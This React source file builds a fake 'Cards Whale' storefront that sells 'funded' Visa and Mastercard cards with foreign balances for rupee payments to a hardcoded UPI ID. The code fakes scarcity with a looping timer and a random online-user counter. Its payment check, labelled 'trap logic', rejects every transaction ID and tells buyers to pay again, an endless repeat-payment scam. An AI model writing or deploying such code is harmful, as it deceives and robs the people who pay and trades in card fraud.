Import React, { useState, useEffect } from 'react';

export default function CardsWhaleApp() {
  const [selectedCard, setSelectedCard] = useState(null);
  const [utrInput, setUtrInput] = useState('');
  const [errorMsg, setErrorMsg] = useState(false);
  const [timeLeft, setTimeLeft] = useState(86400); // 24 hours
  const [onlineCount, setOnlineCount] = useState(249);

  // 24-hour loop timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 86400));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Fluctuating online counter
  useEffect(() => {
    const onlineInterval = setInterval(() => {
      const fluctuation = Math.floor(Math.random() * 7) - 3;
      setOnlineCount((prev) => Math.max(200, prev + fluctuation));
    }, 4000);
    return () => clearInterval(onlineInterval);
  }, []);

  const formatTime = (seconds) => {
    const h = Math.floor(seconds / 3600).toString().padStart(2, '0');
    const m = Math.floor((seconds % 3600) / 60).toString().padStart(2, '0');
    const s = (seconds % 60).toString().padStart(2, '0');
    return `${h} : ${m} : ${s}`;
  };

  const handleVerify = (e) => {
    e.preventDefault();
    // Trap logic: force UTR error and demand re-payment loop
    setErrorMsg(true);
    setUtrInput('');
  };

  return (
    <div className="min-h-screen bg-[#0b0b14] text-slate-100 font-sans pb-12">
      {/* Top Bar */}
      <header className="flex justify-between items-center px-4 py-4 border-b border-slate-800 bg-[#12121e]">
        <div className="flex items-center space-x-2">
          <div className="w-8 h-8 rounded-lg bg-gradient-to-tr from-blue-500 to-purple-600 flex items-center justify-center font-bold">🐳</div>
          <span className="font-semibold text-lg tracking-wide text-white">Cards Whale</span>
        </div>
        <div className="flex items-center space-x-3">
          <span className="text-xs bg-emerald-500/10 text-emerald-400 px-2.5 py-1 rounded-full font-mono flex items-center gap-1.5 border border-emerald-500/20">
            <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span> {onlineCount} online
          </span>
        </div>
      </header>

      {/* Main Container */}
      <main className="max-w-md mx-auto p-4 space-y-4">
        
        {/* Banner */}
        <div className="bg-gradient-to-br from-[#1a1333] to-[#121026] border border-purple-500/30 rounded-2xl p-5 relative overflow-hidden shadow-xl">
          <div className="absolute top-0 right-0 bg-purple-600/20 px-3 py-1 rounded-bl-xl text-[10px] font-mono text-purple-300 border-l border-b border-purple-500/30">
            LIMITED TIME · 101% GUARANTEE
          </div>
          <h2 className="text-2xl font-bold text-white mb-1">Premium Funded Cards</h2>
          <p className="text-purple-300 font-medium text-sm mb-4">at Unbeatable Prices</p>
          
          <div className="bg-[#12101f] border border-purple-500/20 rounded-xl p-3 flex justify-between items-center mb-4">
            <div>
              <span className="text-[11px] text-slate-400 block font-mono">TIMER RESET LOOP</span>
              <span className="text-lg font-mono font-bold text-amber-400">{formatTime(timeLeft)}</span>
            </div>
            <span className="text-xs bg-amber-500/10 text-amber-300 px-2.5 py-1 rounded font-mono">Daily Refill</span>
          </div>

          <div className="bg-gradient-to-r from-purple-900/60 to-indigo-950/60 border border-purple-500/40 rounded-xl p-4 flex justify-between items-center">
            <div>
              <span className="text-xs text-purple-300 font-semibold block">🔥 $100+ Funded Card</span>
              <div className="flex items-baseline gap-2 mt-1">
                <span className="text-xl font-bold text-cyan-400 font-mono">₹249</span>
                <span className="text-xs text-slate-400 line-through font-mono">₹5,000</span>
              </div>
            </div>
            <button 
              onClick={() => setSelectedCard({ title: '$100+ Funded Card', price: '₹249' })}
              className="bg-purple-600 hover:bg-purple-500 text-white font-medium px-4 py-2 rounded-xl text-sm transition shadow-lg shadow-purple-600/30"
            >
              Grab Now
            </button>
          </div>
        </div>

        {/* Card Catalog */}
        <div className="space-y-3">
          <h3 className="text-sm font-semibold text-slate-400 uppercase tracking-wider">Available Cards</h3>
          
          {[
            { type: 'VISA', country: 'US', num: '656865 •••• 2826', bal: '$142.00', price: '₹349' },
            { type: 'MASTER', country: 'CA', num: '479960 •••• 1641', bal: '$308.00', price: '₹499' }
          ].map((c, i) => (
            <div key={i} className="bg-[#141422] border border-slate-800 rounded-xl p-4 flex justify-between items-center">
              <div>
                <div className="flex items-center gap-2 mb-1">
                  <span className="text-xs font-bold text-white bg-slate-800 px-2 py-0.5 rounded">{c.type}</span>
                  <span className="text-[10px] bg-blue-500/10 text-blue-400 px-1.5 py-0.5 rounded">{c.country}</span>
                </div>
                <div className="font-mono text-xs text-slate-300 mb-1">{c.num}</div>
                <div className="text-xs text-emerald-400 font-mono font-semibold">Balance: {c.bal}</div>
              </div>
              <div className="text-right">
                <div className="text-sm font-bold text-white mb-2 font-mono">{c.price}</div>
                <button 
                  onClick={() => setSelectedCard({ title: `${c.type} Card (${c.bal})`, price: c.price })}
                  className="bg-purple-600 hover:bg-purple-500 text-white text-xs px-3 py-1.5 rounded-lg font-medium transition"
                >
                  Buy Now
                </button>
              </div>
            </div>
          ))}
        </div>

        {/* Payment Modal with QR & Seller UPI */}
        {selectedCard && (
          <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex justify-center items-center p-4 z-50">
            <div className="bg-[#141422] border border-purple-500/30 w-full max-w-sm rounded-2xl p-5 relative shadow-2xl">
              <button 
                onClick={() => { setSelectedCard(null); setErrorMsg(false); }}
                className="absolute top-4 right-4 text-slate-400 hover:text-white"
              >
                ✕
              </button>

              <h3 className="text-lg font-bold text-white mb-1">Complete Payment</h3>
              <p className="text-xs text-slate-400 mb-3">Item: <span className="text-purple-300 font-medium">{selectedCard.title}</span></p>

              <div className="bg-purple-950/40 border border-purple-500/30 rounded-xl p-3 text-center mb-3">
                <span className="text-xs text-slate-400 block mb-0.5">Amount to Pay</span>
                <span className="text-2xl font-bold text-amber-400 font-mono">{selectedCard.price}</span>
              </div>

              {/* QR Code Display Box */}
              <div className="bg-white p-3 rounded-xl mb-3 flex justify-center items-center">
                <div className="w-36 h-36 bg-slate-100 border border-slate-300 flex flex-col items-center justify-center text-slate-700 text-xs font-mono text-center rounded">
                  <span>[SCAN QR CODE]</span>
                  <span className="text-[10px] text-slate-500 mt-1">Pay to Seller</span>
                </div>
              </div>

              {/* Seller UPI ID with Copy button */}
              <div className="bg-[#1a1a2e] p-2.5 rounded-xl flex justify-between items-center mb-3 border border-slate-800">
                <div>
                  <span className="text-[10px] text-slate-400 block">Seller UPI ID</span>
                  <span className="text-xs font-mono text-yellow-400 font-semibold">dosuri@fam</span>
                </div>
                <button 
                  onClick={() => navigator.clipboard.writeText('dosuri@fam')}
                  className="text-xs bg-slate-800 hover:bg-slate-700 text-white px-2.5 py-1 rounded"
                >
                  Copy
                </button>
              </div>

              <form onSubmit={handleVerify} className="space-y-3">
                <input 
                  type="text" 
                  placeholder="Enter UTR / Transaction ID" 
                  value={utrInput}
                  onChange={(e) => setUtrInput(e.target.value)}
                  required
                  className="w-full bg-[#10101a] border border-slate-700 rounded-xl px-3 py-2.5 text-xs text-white placeholder-slate-500 focus:outline-none focus:border-purple-500 font-mono"
                />

                {errorMsg && (
                  <div className="bg-red-500/10 border border-red-500/30 text-red-400 text-[11px] p-2 rounded-lg text-center font-medium">
                    ⚠️ Invalid UTR Code! Transaction failed verification. Please pay again and enter correct UTR.
                  </div>
                )}

                <button 
                  type="submit"
                  className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-medium py-3 rounded-xl text-sm transition shadow-lg shadow-emerald-600/20"
                >
                  ✓ I've Paid — Verify
                </button>
              </form>
            </div>
          </div>
        )}

      </main>
    </div>
  );
      }
